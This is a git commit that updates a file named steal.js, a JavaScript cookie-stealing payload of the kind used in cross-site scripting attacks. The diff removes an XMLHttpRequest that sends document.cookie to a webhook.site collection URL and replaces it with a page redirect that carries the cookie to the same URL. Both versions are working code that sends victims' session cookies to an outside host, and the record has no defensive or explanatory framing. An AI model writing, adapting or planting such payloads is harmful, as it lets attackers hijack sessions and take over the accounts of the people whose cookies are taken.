d33041bcd55be5b5a543709eeefc97d5ed11e194
Moonkey182 <monkeybox182@gmail.com>
2026-05-14 23:00:14 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,3 +1,1 @@
-var x = new XMLHttpRequest();
-x.open('GET', 'https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c=' + document.cookie, true);
-x.send();
+document.location='https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c=' + document.cookie;
